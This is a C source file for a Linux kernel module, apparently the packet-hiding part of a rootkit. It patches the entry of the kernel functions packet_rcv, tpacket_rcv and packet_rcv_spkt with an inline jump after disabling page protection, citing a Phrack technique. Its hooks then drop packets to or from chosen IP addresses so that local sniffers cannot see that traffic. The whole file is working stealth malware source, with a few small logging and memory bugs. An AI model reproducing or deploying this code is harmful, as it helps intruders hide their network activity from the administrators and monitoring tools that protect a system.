#include "utils.h"
#include "packet_hiding.h"

/*
 * explanation of code:
 *
 * source: http://phrack.org/issues/61/13.html
 *
 *  mov rax, (address of our function)
 * 	push rax
 *	ret
 *
 * which generates the byte code
 *
 *	0x48 0xb8 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 
 *  	0x50 0xc3
 *
 * in the future: modify bytecode to follow the calling convention.
 * probably amd64 architecture.
 */

/* counter for access counting */
static int accesses_packet_rcv = 0;
static int accesses_tpacket_rcv = 0;
static int accesses_packet_rcv_spkt = 0;

/* mutexes for safe accesses */
struct mutex lock_packet_rcv;
struct mutex lock_tpacket_rcv;
struct mutex lock_packet_rcv_spkt;

/* hidden packets ip lists */
struct data_node *packets_ipv4 = NULL;
struct data_node *packets_ipv6 = NULL;

/* our function hijacking */
char jump_assembly[ASSEMBLY_LENGTH] = ASSEMBLY_JUMP;

/* to store the function pointer, we need an offset of 2 
 * (to the first 0x00 byte)
 */
unsigned long *jump_pointer = (unsigned long *)(jump_assembly + 2);

/* arrays to store original first bytes of assembly instruction */
char original_packet_rcv_assembly[ASSEMBLY_LENGTH];
char original_tpacket_rcv_assembly[ASSEMBLY_LENGTH];
char original_packet_rcv_spkt_assembly[ASSEMBLY_LENGTH];

/* pointer to original packet receive functions */
int (*original_packet_rcv)(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);
int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);
int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);

int fake_packet_rcv(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);
int fake_tpacket_rcv(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);
int fake_packet_rcv_spkt(struct sk_buff *, struct net_device *, 
	struct packet_type *, struct net_device *);

int find_packet_ipv4(u8 *ip_addr)
{
	return find_data_node(&packets_ipv4, 
		(void *)ip_addr, IPV4_LENGTH) != NULL;
}

int find_packet_ipv6(u8 *ip_addr)
{
	return find_data_node(&packets_ipv6, 
		(void *)ip_addr, IPV6_LENGTH) != NULL;
}

int packet_check(struct sk_buff *skb)
{
	/* check for ipv4 */
	if (skb->protocol == htons(ETH_P_IP)) {
		/* get ipv4 header */
		struct iphdr *header = ip_hdr(skb);

		/* look for source and destination address */
		if(find_packet_ipv4((u8 *)&header->saddr) 
			|| find_packet_ipv4((u8 *)&header->daddr)) {
			debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);

			/* ip in list, should be hidden */
			return 1;
		}
	}

	/* check for ipv6 */
	if(skb->protocol == htons(ETH_P_IPV6)) {
		/* get ipv6 header */
		struct ipv6hdr *header = ipv6_hdr(skb);

		/* look for source and destination address */
		if(find_packet_ipv6(header->saddr.s6_addr) 
			|| find_packet_ipv6(header->daddr.s6_addr)) {
			debug("IPV6 SENDER %pI6 IN LIST", 
				header->saddr.s6_addr);

			/* ip in list, should be hidden */
			return 1;
		}
	}

	/* no ipv4 or ipv6 packet or not found in list */
	return 0;
}

void packet_hide(char *protocol, char *ip)
{
	u8 *ipv4_addr = kmalloc(sizeof(u8) * 4, GFP_KERNEL);
	u8 *ipv6_addr = kmalloc(sizeof(u8) * 16, GFP_KERNEL);

	if(in4_pton(ip, -1, ipv4_addr, -1, NULL) 
		&& !strncmp(protocol, "ipv4", 4)) {

		/* no errors, check for occurence in list */
		if(!find_packet_ipv4(ipv4_addr)) {
			debug("INSERT IPV4 SENDER %pI4", ipv4_addr);
			insert_data_node(&packets_ipv4, (void *)ipv4_addr);
		}

		return;
	}

	if(in6_pton(ip, -1, ipv6_addr, -1, NULL) 
		&& !strncmp(protocol, "ipv6", 4)) {

		/* no errors, check for occurence in list */
		if(!find_packet_ipv6(ipv6_addr)) {
			debug("INSERT IPV4 SENDER %pI6", ipv6_addr);
			insert_data_node(&packets_ipv6, (void *)ipv6_addr);
		}
	}
}

void packet_unhide(char *protocol, char *ip)
{
	u8 ipv4_addr[4];
	u8 ipv6_addr[16];

	if(in4_pton(ip, -1, ipv4_addr, -1, NULL) 
		&& !strcmp(protocol, "ipv4")) {
		/* ipv4 address in list, remove */
		struct data_node *node = find_data_node(&packets_ipv4, 
			(void *)ipv4_addr, IPV4_LENGTH);

		if(node != NULL) {
			debug("REMOVE IPV4 SENDER %pI4", ipv4_addr);
			kfree(node->data);
			delete_data_node(&packets_ipv4, node);
		}

		return;
	}

	if(in6_pton(ip, -1, ipv6_addr, -1, NULL) 
		&& !strcmp(protocol, "ipv6")) {
		/* ipv6 address in list, remove */
		struct data_node *node = find_data_node(&packets_ipv6, 
			(void *)ipv6_addr, IPV6_LENGTH);

		if(node != NULL) {
			debug("REMOVE IPV6 SENDER %pI6", ipv4_addr);
			kfree(node->data);
			delete_data_node(&packets_ipv6, node);
		}
	}
}

void hijack_packet_rcv(void)
{
	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
	disable_page_protection();
	debug("HIJACKING PACKET_RCV FUNCTION");

	/* update jump_pointer */
	*jump_pointer = (unsigned long) fake_packet_rcv;
	memcpy(original_packet_rcv, jump_assembly, ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
}


void reset_packet_rcv(void)
{
	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
	disable_page_protection();
	debug("RESETTING PACKET_RCV FUNCTION");

	/* update jump_pointer */
	memcpy(original_packet_rcv, original_packet_rcv_assembly, 
		ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
}


void hijack_tpacket_rcv(void)
{
	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
	disable_page_protection();
	debug("HIJACKING TPACKET_RCV FUNCTION");

	/* update jump_pointer */
	*jump_pointer = (unsigned long) fake_tpacket_rcv;
	memcpy(original_tpacket_rcv, jump_assembly, ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
}


void reset_tpacket_rcv(void)
{
	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
	disable_page_protection();
	debug("RESETTING TPACKET_RCV FUNCTION");

	/* update jump_pointer */
	memcpy(original_tpacket_rcv, original_tpacket_rcv_assembly, 
		ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
}


void hijack_packet_rcv_spkt(void)
{
	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
	disable_page_protection();
	debug("HIJACKING PACKET_RCV_SPKT FUNCTION");

	/* update jump_pointer */
	*jump_pointer = (unsigned long) fake_packet_rcv_spkt;
	memcpy(original_packet_rcv_spkt, jump_assembly, ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
}


void reset_packet_rcv_spkt(void)
{
	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
	disable_page_protection();
	debug("RESETTING PACKET_RCV_SPKT FUNCTION");

	/* update jump_pointer */
	memcpy(original_packet_rcv_spkt, original_packet_rcv_spkt_assembly, 
		ASSEMBLY_LENGTH);

	enable_page_protection();
	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
}

int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
	struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);

	/* Check if we need to hide packet */
	if(packet_check(skb)) {
		debug("PACKET DROP");
		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
		return NF_DROP;
	}

	/* switch functions */
	reset_packet_rcv();
	ret = original_packet_rcv(skb, dev, pt, orig_dev);
	hijack_packet_rcv();

	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
	debug("PACKET ACCEPT");

	return ret;
}


int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, 
	struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);

	if(packet_check(skb)) {
		debug("PACKET DROP");
		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
		return NF_DROP;
	}

	/* switch functions */
	reset_tpacket_rcv();
	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
	hijack_tpacket_rcv();

	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
	debug("PACKET ACCEPT");

	return ret;
}

int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, 
	struct packet_type *pt, struct net_device *orig_dev)
{

	int ret;

	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);

	if(packet_check(skb)) {
		debug("PACKET DROP");
		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
		return NF_DROP;
	}

	/* switch functions */
	reset_packet_rcv_spkt();
	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
	hijack_packet_rcv_spkt();

	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
	debug("PACKET ACCEPT");

	return ret;
}

int packet_hiding_init(void) {

	debug("INITIALIZE PACKET HIDING");

	original_packet_rcv = (void *)kallsyms_lookup_name("packet_rcv");
	original_tpacket_rcv = (void *)kallsyms_lookup_name("tpacket_rcv");
	original_packet_rcv_spkt = (void *)kallsyms_lookup_name("packet_rcv_spkt");

	/* initialize mutexes */
	mutex_init(&lock_packet_rcv);
	mutex_init(&lock_tpacket_rcv);
	mutex_init(&lock_packet_rcv_spkt);

	/* backup original function pointers */
	memcpy(original_packet_rcv_assembly, original_packet_rcv, 
		ASSEMBLY_LENGTH);
	memcpy(original_tpacket_rcv_assembly, original_tpacket_rcv, 
		ASSEMBLY_LENGTH);
	memcpy(original_packet_rcv_spkt_assembly, original_packet_rcv_spkt, 
		ASSEMBLY_LENGTH);

	/* hijack every function */
	hijack_packet_rcv();
	hijack_tpacket_rcv();
	hijack_packet_rcv_spkt();

	return 0;
}


void packet_hiding_exit(void) {

	debug("EXIT PACKET HIDING");

	/* reset every function */
	reset_packet_rcv();
	reset_tpacket_rcv();
	reset_packet_rcv_spkt();

	/* clear ipv4 list */
	free_data_node_list(&packets_ipv4);

	/* clear ipv6 list */
	free_data_node_list(&packets_ipv6);

	while(accesses_packet_rcv > 0 || accesses_tpacket_rcv > 0 
		|| accesses_packet_rcv_spkt > 0)
		msleep(50);
}

MODULE_LICENSE("GPL");